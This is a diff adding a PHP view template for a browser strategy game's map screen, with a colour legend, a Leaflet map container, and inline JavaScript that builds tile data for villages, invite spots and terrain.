+                                <td class="small" style="white-space: normal;">
+                                    <?= __('screens.map.legend_own_villages') ?>
+                                </td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(0, 0, 244);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_tribe') ?>
+                                </td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(150, 150, 150);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_barbarian') ?>
+                                </td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(130, 60, 10);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_other') ?>
+                                </td>
+                            </tr>
+                            <tr class="nowrap">
+                                <td class="small" valign="top"><?= __('screens.map.legend_tribe') ?></td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(0, 160, 244);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_allied') ?>
+                                </td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(128, 0, 128);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_nap') ?></td>
+                                <td
+                                    style="padding: 0px; width: 15px; min-width: 15px; height: 15px; background-color: rgb(244, 0, 0);">&nbsp;
+                                </td>
+                                <td class="small" style="white-space: normal;"><?= __('screens.map.legend_enemies') ?>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <div style="margin-top: 10px; font-weight: bold;">
+                        <a href="game.php?village=<?= $village['id'] ?>&screen=edytuj_kolory_graczy">&raquo; <?= __('screens.ally.mark_on_map') ?: 'Marcar jogador no mapa' ?></a>
+                    </div>
+                </td>
+            </tr>
+        </table>
+
+    </div>
+
+    <!-- Leaflet Map Container (hidden by default) -->
+    <div id='map-leaflet'
+        style='display: none; width: 795px; height: 570px; border: 1px solid #8C5F0D; background: #F4E4BC; margin: 0 auto;'>
+    </div>
+</div>
+
+<!-- Leaflet.js and TW Leaflet Map Script -->
+
+<script>
+    var currentMapX = <?= $mapa['x'] ?>;
+    var currentMapSize = <?= $mapa['rozmiar'] ?? 13 ?>;
+    var currentMapY = <?= $mapa['y'] ?>;
+
+    var mapData = {
+        x_coords: <?= json_encode($x_coords) ?>,
+        y_coords: <?= json_encode($y_coords) ?>,
+        tiles: {},
+        faith_circles: <?= json_encode($faith_circles) ?>,
+        watchtower_circles: <?= json_encode($watchtower_circles) ?>
+    };
+
+    // Build tiles data from PHP
+    <?php foreach ($y_coords as $y): ?>
+        <?php foreach ($x_coords as $x): ?>
+            <?php
+            $coords = $x . '|' . $y;
+            $has_faith = false;
+            foreach ($faith_circles as $fc) {
+                $dist = sqrt(pow($x - $fc['x'], 2) + pow($y - $fc['y'], 2));
+                if ($dist <= $fc['radius']) {
+                    $has_faith = true;
+                    break;
+                }
+            }
+
+            if ($mapLibrary->isVillage($coords)):
+                ?>
+                mapData.tiles['<?= $coords ?>'] = {
+                    type: 'village',
+                    id: <?= $mapLibrary->getVillageId($coords) ?>,
+                    name: <?= json_encode($mapLibrary->getVillageName($coords)) ?>,
+                    graphic: '<?= $mapLibrary->getVillageGraphic($coords) ?>',
+                    color: '<?= $mapLibrary->getVillageColorStyle($coords, $village['id'], $user['id'], $user['ally'] ?? -1) ?>',
+                    player: <?= json_encode($mapLibrary->getPlayerInfo($coords)) ?>,
+                    ally: <?= json_encode($mapLibrary->getAllyInfo($coords)) ?>,
+                    continent: '<?= $mapLibrary->getContinent($coords) ?>',
+                    commands: <?= json_encode($mapLibrary->getVillageCommands($coords)) ?>
+                };
+            <?php elseif ($mapLibrary->isGhost($coords)):
+                $ghost = $mapLibrary->getGhostData($coords);
+                $isPending = $ghost['status'] === 'pending';
+                ?>
+                mapData.tiles['<?= $coords ?>'] = {
+                    type: 'ghost',
+                    x: <?= $x ?>,
+                    y: <?= $y ?>,
+                    status: '<?= $ghost['status'] ?>',
+                    title: <?= json_encode($isPending ? __('screens.map.invited_friend') : __('screens.map.invite_friend')) ?>,
+                    description: <?= json_encode($isPending ? __('screens.map.invited_friend_desc', ['email' => htmlspecialchars($ghost['email'])]) : __('screens.map.invite_friend_desc')) ?>,
+                    invite_url: '<?= $isPending ? "game.php?village=" . $village['id'] . "&screen=profile&mode=invite" : "game.php?village=" . $village['id'] . "&screen=profile&mode=invite&invite_x=" . $x . "&invite_y=" . $y ?>',
+                    invite_text: '<?= $isPending ? __('screens.map.view_invites') : __('screens.map.invite') ?>',
+                    graphic: 'ghost'
+                };
+            <?php elseif ($mapLibrary->isDecoration($coords)):
+                $dec = $mapLibrary->getDecoration($coords);
+                ?>
+                mapData.tiles['<?= $coords ?>'] = { type: 'decoration', graphic: '<?= str_replace('.png', '', $dec['typ']) ?>' };
+            <?php elseif ($mapLibrary->isBush($coords)): ?>
+                mapData.tiles['<?= $coords ?>'] = { type: 'bush', graphic: '<?= str_replace('.png', '', $mapLibrary->getBushType($coords)) ?>' };
+            <?php elseif ($mapLibrary->isGrass($coords)): ?>
+                mapData.tiles['<?= $coords ?>'] = { type: 'grass', graphic: '<?= str_replace('.png', '', $mapLibrary->getGrassType($coords)) ?>' };
+            <?php else: ?>
+                mapData.tiles['<?= $coords ?>'] = { type: 'grass', graphic: 'gras1' };
+            <?php endif; ?>
+        <?php endforeach; ?>
+    <?php endforeach; ?>
+
+    console.log('Map data loaded:', Object.keys(mapData.tiles).length, 'tiles');
+</script>
+
+</div>
+
+<!-- Leaflet Map Container -->
+<div id="map-leaflet" style="display: none; width: 795px; height: 570px; border: 1px solid #8C5F0D; margin: 0 auto;">
+</div>
+</div>
+<script src="/js/leaflet.js"></script>
+<script src="/js/map_leaflet_combined.js?v=<?= file_exists(__DIR__ . '/../../../public/js/map_leaflet_combined.js') ? filemtime(__DIR__ . '/../../../public/js/map_leaflet_combined.js') : '1' ?>"></script>
+<script>
+    var currentMapX = <?= $mapa['x'] ?>;
+    var currentMapY = <?= $mapa['y'] ?>;
+    var currentVillageId = <?= $village['id'] ?>;
+    var currentVillageX = <?= $village['x'] ?>;
+    var currentVillageY = <?= $village['y'] ?>;
+    var currentMapSize = <?= $mapSize ?>;
+    var isNightMode = <?= isset($map_folder) && $map_folder === 'map_dark' ? 'true' : 'false' ?>;
+    var mapFolder = '<?= $map_folder ?? 'map' ?>';
+</script>
+
+<!-- Village Popup Container (used by map_popup function) -->
+<!--<div id="info"
+    style="visibility: hidden; position: absolute; z-index: 1000; background: #f4e4bc; border: 2px solid #7d510f; padding: 8px; font-size: 11px; min-width: 200px;">
+    <table class="vis" style="width: 100%;">
+        <tr id="info_title_row">
+            <th id="info_title" colspan="2"></th>
+        </tr>
+        <tr id="info_points_row">
+            <td>Pontos:</td>
+            <td id="info_points"></td>
+        </tr>
+        <tr id="info_owner_row" style="display: none;">
+            <td>Proprietário:</td>
+            <td id="info_owner"></td>
+        </tr>
+        <tr id="info_left_row" style="display: none;">
+            <td colspan="2">Abandonada</td>
+        </tr>
+        <tr id="info_ally_row" style="display: none;">
+            <td>Tribo:</td>
+            <td id="info_ally"></td>
+        </tr>
+        <tr id="info_village_grocusto_row" style="display: none;">
+            <td>Continente:</td>
+            <td id="info_village_grocusto"></td>
+        </tr>
+        <tr id="info_bonus_image_row" style="display: none;">
+            <td colspan="2" align="center">
+                <img id="image" src="" alt="" />
+            </td>
+        </tr>
+        <tr id="info_bonus_row" style="display: none;">
+            <td>Bônus:</td>
+            <td id="text_bonus"></td>
+        </tr>
+        <tr id="info_units_times_row" style="display: none;">
+            <td colspan="2" id="info_units_times"></td>
+        </tr>
+    </table>
+</div>-->
+
+<?php include __DIR__ . '/map_modal.php'; ?>
